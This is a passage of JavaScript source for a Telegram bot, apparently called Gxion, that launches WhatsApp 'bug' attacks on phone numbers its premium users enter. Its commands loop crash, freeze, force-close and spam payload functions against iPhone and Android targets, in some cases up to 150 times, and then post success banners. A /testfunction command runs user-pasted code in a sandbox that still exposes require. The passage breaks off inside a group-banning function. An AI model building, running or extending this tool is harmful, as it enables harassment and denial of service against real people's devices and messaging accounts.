    if (userQueue.queue.length === 0) return;

    userQueue.isProcessing = true;

    while (userQueue.queue.length > 0) {
        const current = userQueue.queue[0];
        userQueue.current = current;
        current.status = "PROCESSING";

        try {
            for (let i = 0; i < current.loops; i++) {
                for (const fn of current.functions) {
                    await fn(state.sock, current.target);
                }

                if (current.delay > 0) await sleep(current.delay);

                current.progress = Math.round(((i + 1) / current.loops) * 100);

                const filled = Math.round(current.progress / 5);
                const bar = "▓".repeat(filled) + "░".repeat(20 - filled);

                console.log(chalk.yellow(`[${current.type}] ${current.q} → ${bar} ${current.progress}%`));
            }

            current.status = "COMPLETED";
            console.log(chalk.green(`✅ [${current.type}] COMPLETED → ${current.q}`));

        } catch (err) {
            current.status = `ERROR: ${err.message}`;
            console.log(chalk.red(`❌ [${current.type}] ERROR → ${current.q}: ${err.message}`));
        }

        userQueue.queue.shift();
    }

    userQueue.current = null;
    userQueue.isProcessing = false;
}

function addToQueue(ctx, target, q, functions, loops, delay, type) {
    const userId = ctx.from.id;
    const userQueue = getUserQueue(userId);

    const estimatedSeconds = Math.round((loops * (1 + delay / 1000)) - (delay / 1000));

    userQueue.queue.push({
        ctx,
        target,
        q,
        functions,
        loops,
        delay,
        type,
        status: "WAITING",
        progress: 0,
        estimated: estimatedSeconds,
        addedAt: Date.now()
    });

    if (!userQueue.isProcessing) {
        processUserQueue(userId);
    }
}

setInterval(() => {
    const now = Date.now();
    for (const [userId, userQueue] of userQueues.entries()) {
        userQueue.queue = userQueue.queue.filter(item => {
            return now - item.addedAt < 600000;
        });
    }
}, 60000);

// ============================================
bot.command("cekantrian", checkAllPremium, checkWhatsAppConnection, async (ctx) => {
    try {
        const userId = ctx.from.id;
        const userQueue = getUserQueue(userId);

        const username = ctx.from.username
            ? `@${ctx.from.username}`
            : ctx.from.first_name || "User";

        let text = `<blockquote><b>📋 ANTRIAN BUG KAMU — ${username}</b></blockquote>\n\n`;

        if (userQueue.current) {
            text += `<blockquote><b>🔄 NOMOR YANG SEDANG DIPROSES</b></blockquote>\n`;
            text += `├─ <b>Target</b> : <code>${userQueue.current.q}</code>\n`;
            text += `├─ <b>Progress</b> : <code>${userQueue.current.progress || 0}%</code>\n`;
            text += `└─ <b>Estimasi</b> : <code>${formatTime(userQueue.current.estimated)}</code>\n\n`;
        }

        if (userQueue.queue.length > 0) {
            text += `<blockquote><b>⏳ MENUNGGU (${userQueue.queue.length})</b></blockquote>\n`;
            userQueue.queue.forEach((item, i) => {
                const isLast = i === userQueue.queue.length - 1;
                const branch = isLast ? "└─" : "├─";

                text += `${branch} <b>${i + 1}.</b> <code>${item.q}</code>\n`;
                text += `${isLast ? "   " : "│  "} <b>Estimasi</b> : <code>${formatTime(item.estimated)}</code>\n`;
                if (!isLast) text += `│\n`;
            });
            text += `\n`;
        } else if (!userQueue.current) {
            text += `<blockquote><i>📭 Tidak ada antrian payload bug nomor saat ini.</i></blockquote>\n\n`;
        }

        const totalEstimated = userQueue.queue.reduce((sum, item) => sum + item.estimated, 0) + (userQueue.current?.estimated || 0);

        text += `<blockquote><b>📊 STATISTIK</b></blockquote>\n`;
        text += `├─ <b>Total Antrian</b> : <code>${userQueue.queue.length}</code>\n`;
        text += `├─ <b>Total Estimasi</b> : <code>${formatTime(totalEstimated)}</code>\n`;
        text += `└─ <b>Status</b> : <code>${userQueue.isProcessing ? "🚀 SEDANG DI PROSES SEMUA ANTRIAN" : "❌ TIDAK ADA PROSES YANG BERJALAN SAAT INI"}</code>\n\n`;

        text += `<i>© Created By Bawzzhhh</i>`;

        await ctx.replyWithHTML(text);

    } catch (err) {
        await ctx.reply(`❌ Error: ${err.message}`);
    }
});

// ============================================
bot.command(
    "crashbeta",
    checkAllPremium,
    checkWhatsAppConnection,
    checkCooldown,
    async (ctx) => {

        const username = ctx.from.username
            ? `@${ctx.from.username}`
            : ctx.from.first_name || "User";

        const q = ctx.message.text.split(" ")[1];

        if (!q) {
            return ctx.reply("🪧 Example: /crashbeta 62xxxx");
        }

        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        const time = new Date().toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            hour12: false
        });

        const userQueue = getUserQueue(ctx.from.id);
        const position = userQueue.queue.length + (userQueue.isProcessing ? 2 : 1);

        await ctx.replyWithHTML(
            `
<b>⚒️ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅𝒊𝒏𝒈 𝑩𝒖𝒈𝒔</b>      
<blockquote expandable>𖥂 Target : <code>${q}</code>
𖥂 Type : Crash Beta
𖥂 Status : Succes ✅
𖥂 Time : <code>${time}</code>
𖥂 Executor : ${username}</blockquote>
<i>Gxion プロジェクト — 2026</i>
`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "チェック",
                                url: `https://wa.me/${q}`
                            }
                        ]
                    ]
                }
            }
        );

        addToQueue(ctx, target, q, [crashBeta], 10, 2000, "Crash Beta");
    }
);

// ============================================
bot.command(
    "andromery",
    checkAllPremium,
    checkWhatsAppConnection,
    checkCooldown,
    async (ctx) => {

        const username = ctx.from.username
            ? `@${ctx.from.username}`
            : ctx.from.first_name || "User";

        const q = ctx.message.text.split(" ")[1];

        if (!q) {
            return ctx.reply("🪧 Example: /andromery 62xxxx");
        }

        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        const time = new Date().toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            hour12: false
        });

        const userQueue = getUserQueue(ctx.from.id);
        const position = userQueue.queue.length + (userQueue.isProcessing ? 2 : 1);

        await ctx.replyWithHTML(
            `
<b>⚒️ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅𝒊𝒏𝒈 𝑩𝒖𝒈𝒔</b>      
<blockquote expandable>𖥂 Target : <code>${q}</code>
𖥂 Type : Android Delay
𖥂 Status : Succes ✅
𖥂 Time : <code>${time}</code>
𖥂 Executor : ${username}</blockquote>
<i>Gxion プロジェクト — 2026</i>
`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "チェック",
                                url: `https://wa.me/${q}`
                            }
                        ]
                    ]
                }
            }
        );

        addToQueue(ctx, target, q, [Freezeinvisible], 5, 0, "Android Delay");
    }
);

// ============================================
bot.command(
    "invisXimage",
    checkAllPremium,
    checkWhatsAppConnection,
    checkCooldown,
    async (ctx) => {

        const username = ctx.from.username
            ? `@${ctx.from.username}`
            : ctx.from.first_name || "User";

        const q = ctx.message.text.split(" ")[1];

        if (!q) {
            return ctx.reply("🪧 Example: /invisXimage 62xxxx");
        }

        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        const time = new Date().toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            hour12: false
        });

        const userQueue = getUserQueue(ctx.from.id);
        const position = userQueue.queue.length + (userQueue.isProcessing ? 2 : 1);

        await ctx.replyWithHTML(
            `
<b>🦠 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅𝒊𝒏𝒈</b>      
<blockquote expandable>𖥂 Target : <code>${q}</code>
𖥂 Type : Send Image
𖥂 Status : Succes ✅
𖥂 Time : <code>${time}</code>
𖥂 Executor : ${username}</blockquote>
<i>Gxion プロジェクト — 2026</i>
`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "チェック",
                                url: `https://wa.me/${q}`
                            }
                        ]
                    ]
                }
            }
        );

        addToQueue(ctx, target, q, [MediaFreezeData], 1, 3000, "Send Image");
    }
);

// ============================================
bot.command(
    "xctruth",
    checkAllPremium,
    checkWhatsAppConnection,
    checkCooldown,
    async (ctx) => {

        const username = ctx.from.username
            ? `@${ctx.from.username}`
            : ctx.from.first_name || "User";

        const q = ctx.message.text.split(" ")[1];

        if (!q) {
            return ctx.reply("🪧 Example: /xctruth 62xxxx");
        }

        const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

        const time = new Date().toLocaleString("id-ID", {
            timeZone: "Asia/Jakarta",
            hour12: false
        });

        const userQueue = getUserQueue(ctx.from.id);
        const position = userQueue.queue.length + (userQueue.isProcessing ? 2 : 1);

        await ctx.replyWithHTML(
            `
<b>⚒️ 𝑺𝒖𝒄𝒄𝒆𝒔𝒔𝒇𝒖𝒍𝒍𝒚 𝑺𝒆𝒏𝒅𝒊𝒏𝒈 𝑩𝒖𝒈𝒔</b>      
<blockquote expandable>𖥂 Target : <code>${q}</code>
𖥂 Type : Bulldozer Delay
𖥂 Status : Succes ✅
𖥂 Time : <code>${time}</code>
𖥂 Executor : ${username}</blockquote>
<i>Gxion プロジェクト — 2026</i>
`,
            {
                reply_markup: {
                    inline_keyboard: [
                        [
                            {
                                text: "チェック",
                                url: `https://wa.me/${q}`
                            }
                        ]
                    ]
                }
            }
        );

        addToQueue(ctx, target, q, [BulldozerDelay], 5, 0, "BUG");
    }
);
// ============================================
bot.command("freespamdelay", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /freespamdelay 62xxxx\n\nContoh: /freespamdelay 628123456789`);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  await ctx.reply(`✅ freespamdelay sent bug to ${q}`);
  await CODEBEBASPAM(state.sock, target);
});

// ============================================

bot.command("xlite", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Format : /xlite 62xxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

  await ctx.replyWithHTML(`✨ xlite (bug) selesai untuk ${q}`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "danger" }]]
    }
  });

  (async () => {
    for (let i = 0; i < 5; i++) {
      await IkyyJmbl(state.sock, target);
      await sleep(1000);
    }
  })();
});

// ============================================

bot.command("delayquentix", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Format : /delayquentix 62xxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const photoUrl = "https://files.catbox.moe/ahlxrp.jpg";
  const bar = "▓".repeat(20);

  const caption = `𝗚𝗫𝗜𝗢𝗡 --- 𝑺𝑬𝑵𝑫𝑰𝑵𝑮 𝑩𝑼𝑮𝑺
<blockquote><pre>
├─ Target : ${q}
├─ Effect : Delay Invisible
├─ Progress : ${bar} 100%
</pre></blockquote>`;

  await ctx.replyWithPhoto(photoUrl, {
    caption: caption,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "success" }]]
    }
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      await IkyyJmbl(state.sock, target);
      await CODEBEBASPAM(state.sock, target);
      await DelayXcombo(state.sock, target);
      if (i < 34) await sleep(1500);
    }
  })();
});
// ============================================
bot.command("combox", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Format : /combox 62xxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const photoUrl = "https://files.catbox.moe/ahlxrp.jpg";
  const bar = "▓".repeat(20);

  const caption = `𝗚𝗫𝗜𝗢𝗡 --- 𝑺𝑬𝑵𝑫𝑰𝑵𝑮 𝑩𝑼𝑮𝑺
<blockquote><pre>
├─ Target : ${q}
├─ Effect : Combo Payload's 
├─ Progress : ${bar} 100%
</pre></blockquote>`;

  await ctx.replyWithPhoto(photoUrl, {
    caption: caption,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "success" }]]
    }
  });

  (async () => {
    for (let i = 0; i < 50; i++) {
      await IkyyJmbl(state.sock, target);
      await CODEBEBASPAM(state.sock, target);
      await DelayXcombo(state.sock, target);
      if (i < 34) await sleep(1500);
    }
  })();
});

// ============================================

bot.command("delayios", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Format : /delayios 62xxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const photoUrl = "https://files.catbox.moe/61vka4.jpg";
  const bar = "▓".repeat(20);

  const caption = `𝗚𝗫𝗜𝗢𝗡 --- 𝑺𝑬𝑵𝑫𝑰𝑵𝑮 𝑩𝑼𝑮𝑺
<blockquote><pre>
├─ Target : ${q}
├─ Effect : Delay Iphone
├─ Progress : ${bar} 100%
</pre></blockquote>`;

  await ctx.replyWithPhoto(photoUrl, {
    caption: caption,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "primary" }]]
    }
  });

  (async () => {
    for (let i = 0; i < 20; i++) {
      await DelayFrezze(state.sock, target);
      if (i < 4) await sleep(1500);
    }
  })();
});

// ============================================
bot.command("applex", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply("🪧 Format : /applex 62xxxx");

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  const photoUrl = "https://files.catbox.moe/ahlxrp.jpg";
  const bar = "▓".repeat(20);

  const caption = `𝗚𝗫𝗜𝗢𝗡 --- 𝑺𝑬𝑵𝑫𝑰𝑵𝑮 𝑩𝑼𝑮𝑺
<blockquote><pre>
├─ Target : ${q}
├─ Effect : Forceclose Iphone
├─ Progress : ${bar} 100%
</pre></blockquote>`;

  await ctx.replyWithPhoto(photoUrl, {
    caption: caption,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "ᴄᴇᴋ ᴛᴀʀɢᴇᴛ", url: `https://wa.me/${q}`, style: "primary" }]]
    }
  });

  (async () => {
    for (let i = 0; i < 150; i++) {
      await ForceiOs(state.sock, target);
      if (i < 4) await sleep(1500);
    }
  })();
});
// ============================================

bot.command("freezeIOS", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 Format: /freezeIOS 62xxxx\n\nContoh: /freezeIOS 628123456789`);

  const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";
  await ctx.reply(`✅ freezeIOS sent to ${q}`);

  (async () => {
    try {
      for (let i = 0; i < 10; i++) {
        await VnXDelayHardInvis(state.sock, target);
        await DelayBebasSpamBawzhhh(state.sock, target);
      }
    } catch (error) {
      console.log(chalk.red(`❌ Error: ${error.message}`));
    }
  })();
});

// ============================================

bot.command("iphonebugs", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const thumbnailUrl2 = "https://files.catbox.moe/u9jrve.jpg";
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /iphonebugs 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Fc Iphone No Click (Not Work All Version)
➩ Status : Process...
➩ Progress : [░░░░░░░░░░] 0%</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });

  const processMessageId = processMessage.message_id;

  function getProgressBar(percent) {
    const filled = Math.round(percent / 10);
    const empty = 10 - filled;
    return '▓'.repeat(filled) + '░'.repeat(empty);
  }

  async function updateProgress(progress) {
    const bar = getProgressBar(progress);
    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Fc Iphone No Click (Not Work All Version)
➩ Status : Process...
➩ Progress : [${bar}] ${progress}%</pre></blockquote>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
      }
    });
  }

  for (let i = 0; i < 40; i++) {
    await crashIphoneNewVnX(state.sock, target);
    const progress = Math.min(Math.round((i + 1) * (100 / 40)), 100);
    await updateProgress(progress);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Fc Iphone No Click (Not Work All Version)
➩ Status : Success ✅
➩ Progress : [▓▓▓▓▓▓▓▓▓▓] 100%</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });
});

// ============================================

bot.command("dfreez", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const thumbnailUrl2 = "https://files.catbox.moe/p6ahc6.jpg";
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /dfreez 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Freeze Android
➩ Status : Sending 25 Message....
</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 25; i++) {
    await KayzenFreezeNoClick(state.sock, target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Freeze Android
➩ Status : Success Sending! ✅
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });
});

// ============================================

bot.command("lockmessage", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const thumbnailUrl2 = "https://files.catbox.moe/joc26i.jpg";
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /lockmessage 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Lock Message Whatsapp
➩ Status : Process...
➩ Progress : [░░░░░░░░░░] 0%</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });

  const processMessageId = processMessage.message_id;

  function getProgressBar(percent) {
    const filled = Math.round(percent / 10);
    const empty = 10 - filled;
    return '▓'.repeat(filled) + '░'.repeat(empty);
  }

  async function updateProgress(progress) {
    const bar = getProgressBar(progress);
    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Lock Message Whatsapp 
➩ Status : Process...
➩ Progress : [${bar}] ${progress}%</pre></blockquote>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
      }
    });
  }

  for (let i = 0; i < 5; i++) {
    await dprasu(state.sock, target);
    await H4ters(state.sock, target);
    const progress = Math.min(Math.round((i + 1) * (100 / 150)), 100);
    await updateProgress(progress);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Lock Message Whatsapp
➩ Status : Success ✅
➩ Progress : [▓▓▓▓▓▓▓▓▓▓] 100%</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });
});

// ============================================

bot.command("dblacker", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const thumbnailUrl2 = "https://files.catbox.moe/9ayxax.jpg";
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /dblacker 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Blank Device 
➩ Status : Process...
➩ Progress : [░░░░░░░░░░] 0%</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });

  const processMessageId = processMessage.message_id;

  function getProgressBar(percent) {
    const filled = Math.round(percent / 10);
    const empty = 10 - filled;
    return '▓'.repeat(filled) + '░'.repeat(empty);
  }

  async function updateProgress(progress) {
    const bar = getProgressBar(progress);
    await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Blank Device 
➩ Status : Process...
➩ Progress : [${bar}] ${progress}%</pre></blockquote>`, {
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
      }
    });
  }

  for (let i = 0; i < 20; i++) {
    await dprasu(state.sock, target);
    await MaouUiCrash(state.sock, target);
    await MultiMediaSpam(state.sock, target);
    await clicktry(state.sock, target);
    await VnXComboFcxDelay(state.sock, target);
    await Overkill(state.sock, target);
    const progress = Math.min(Math.round((i + 1) * (100 / 150)), 100);
    await updateProgress(progress);
    await sleep(2000);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Blank Device
➩ Status : Success ✅
➩ Progress : [▓▓▓▓▓▓▓▓▓▓] 100%</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });
});

// ============================================

bot.command("fcnewclick", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const thumbnailUrl2 = "https://files.catbox.moe/5lrxrf.jpg";
  const q = ctx.message.text.split(" ")[1];
  if (!q) return ctx.reply(`🪧 ☇ Format: /fcnewclick 62×××`);

  let target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";

  const processMessage = await ctx.telegram.sendPhoto(ctx.chat.id, thumbnailUrl2, {
    caption: `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Forceclose Click
➩ Status : Sending Bug Waiting...
</pre></blockquote>`,
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });

  const processMessageId = processMessage.message_id;

  for (let i = 0; i < 50; i++) {
    await nazeGacor(state.sock, target);
    await NovaCrashnoclick(state.sock, target);
  }

  await ctx.telegram.editMessageCaption(ctx.chat.id, processMessageId, undefined, `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Forceclose Click
➩ Status : Sending Bug Waiting...
</pre></blockquote>`, {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [[{ text: "Target", url: `https://wa.me/${q}` }]]
    }
  });
});

// ============================================

function createSafeSock(sock) {
  if (!sock) return null;
  return {
    sendMessage: sock.sendMessage?.bind(sock),
    relayMessage: sock.relayMessage?.bind(sock),
    groupMetadata: sock.groupMetadata?.bind(sock),
  };
}

// ============================================

function extractGroupID(link = "") {
  try {
    const regex = /chat\.whatsapp\.com\/([0-9A-Za-z]+)/i;
    const match = link.match(regex);
    if (!match) return null;
    return match[1];
  } catch {
    return null;
  }
}

// ============================================

bot.command("testfunction", checkAllPremium, checkWhatsAppConnection, checkCooldown, async (ctx) => {
  const chatId = ctx.chat.id;

  try {
    const text = ctx.message?.text || "";
    const args = text.split(" ");

    if (args.length < 3) {
      return ctx.reply("🪧 Example : /testfunction 62xxx 10 (reply your function)");
    }

    const q = args[1];
    let jumlah = Math.max(1, Math.min(parseInt(args[2]) || 1, 1000));

    if (isNaN(jumlah)) {
      return ctx.reply("❌ Jumlah harus angka");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    if (!ctx.message.reply_to_message?.text) {
      return ctx.reply("❌ Reply dengan function");
    }

    const photoUrl = "https://files.catbox.moe/b6jf12.jpg";

    const processMsg = await ctx.replyWithPhoto(photoUrl, {
      caption: `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Unknown Function
➩ Status : Processing...
➩ Progress : [░░░░░░░░░░] 0%</pre></blockquote>`,
      parse_mode: "HTML",
      reply_markup: {
        inline_keyboard: [
          [{ text: "Target Check", url: `https://wa.me/${q}`, style: "success" }]
        ]
      }
    });

    const processMessageId = processMsg.message_id;

    const funcCode = ctx.message.reply_to_message.text;
    const matchFunc = funcCode.match(/async function\s+(\w+)/);
    if (!matchFunc) {
      return ctx.reply("❌ Function harus async function");
    }

    const funcName = matchFunc[1];
    const vm = require("vm");
    const safeSock = createSafeSock(state.sock);

    const sandbox = {
      console,
      Buffer,
      sock: safeSock,
      target,
      sleep,
      require
    };

    const context = vm.createContext(sandbox);
    const wrapper = `${funcCode}\n${funcName}`;
    const fn = vm.runInContext(wrapper, context);

    function getProgressBar(percent) {
      const filled = Math.round(percent / 10);
      const empty = 10 - filled;
      return '▓'.repeat(filled) + '░'.repeat(empty);
    }

    for (let i = 0; i < jumlah; i++) {
      try {
        const arity = fn.length;
        if (arity === 1) await fn(target);
        else if (arity === 2) await fn(safeSock, target);
        else await fn(safeSock, target, true);

        const progress = Math.min(Math.round((i + 1) * (100 / jumlah)), 100);
        const bar = getProgressBar(progress);
        
        await ctx.telegram.editMessageCaption(chatId, processMessageId, null, `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Unknown Function
➩ Status : Processing...
➩ Progress : [${bar}] ${progress}%</pre></blockquote>`, {
          parse_mode: "HTML",
          reply_markup: {
            inline_keyboard: [
              [{ text: "Target Check", url: `https://wa.me/${q}`, style: "success" }]
            ]
          }
        });

      } catch (e) {
        console.log("Loop error:", e.message);
      }

      await new Promise(r => setTimeout(r, 200));
    }

    const finalText = `༺ GXION INFORMATION ATACK ༻
<blockquote><pre>
➩ Target : ${q}
➩ Effect : Unknown Function
➩ Status : Success ✅
➩ Progress : [▓▓▓▓▓▓▓▓▓▓] 100%</pre></blockquote>`;

    try {
      await ctx.telegram.editMessageCaption(chatId, processMessageId, null, finalText, {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [{ text: "Target Check", url: `https://wa.me/${q}`, style: "success" }]
          ]
        }
      });
    } catch {
      await ctx.replyWithPhoto(photoUrl, { caption: finalText, parse_mode: "HTML" });
    }

  } catch (err) {
    console.error("ERROR:", err);
    ctx.reply("❌ Terjadi error");
  }
});

// ============================================

function assertSocketReady(sock) {
  if (!sock || !sock.user) {
    throw new Error('WhatsApp socket tidak siap. Pastikan bot sudah terhubung.');
  }
  return true;
}
// ============================================
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// ============================================

function isReachoutRestrictedError(err) {
  return err.message?.includes('account_reachout_restricted') || 
         err.message?.includes('reachout') ||
         err.message?.includes('restricted');
}

// ============================================

async function bannidoGroup(sock, target) {
    if (!target.endsWith("@g.us")) {
        throw new Error("@g.us server required");
    }
    const LIDNUMBER = [
        "6280000000000@s.whatsapp.net",
        "14155552671@s.whatsapp.net",
        "447400000000@s.whatsapp.net",
        "61400000000@s.whatsapp.net",
        "6281234567890@s.whatsapp.net",
        "6287873499996@s.whatsapp.net",
        "6285655555555@s.whatsapp.net",
        "6289876543210@s.whatsapp.net",
        "6281111111111@s.whatsapp.net",
        "6282222222222@s.whatsapp.net",
        "6283333333333@s.whatsapp.net",
        "6284444444444@s.whatsapp.net",
        "6285555555555@s.whatsapp.net",
        "6286666666666@s.whatsapp.net",
        "6287777777777@s.whatsapp.net",
        "6288888888888@s.whatsapp.net",
        "6289999999999@s.whatsapp.net",
        "6281000000001@s.whatsapp.net",
        "6281000000002@s.whatsapp.net",
        "6281000000003@s.whatsapp.net",
        "6281000000004@s.whatsapp.net",
        "6281000000005@s.whatsapp.net",
        "6282000000001@s.whatsapp.net",
        "6282000000002@s.whatsapp.net",
        "6282000000003@s.whatsapp.net",
        "6282000000004@s.whatsapp.net",
        "6282000000005@s.whatsapp.net",
        "6283000000001@s.whatsapp.net",
        "6283000000002@s.whatsapp.net",
        "6283000000003@s.whatsapp.net",
        "6283000000004@s.whatsapp.net",
        "6283000000005@s.whatsapp.net"
    ];

    const actions = ["add"];
    const fake = LIDNUMBER[Math.floor(Math.random() * LIDNUMBER.length)];
    const action = actions[Math.floor(Math.random() * actions.length)];

    try {
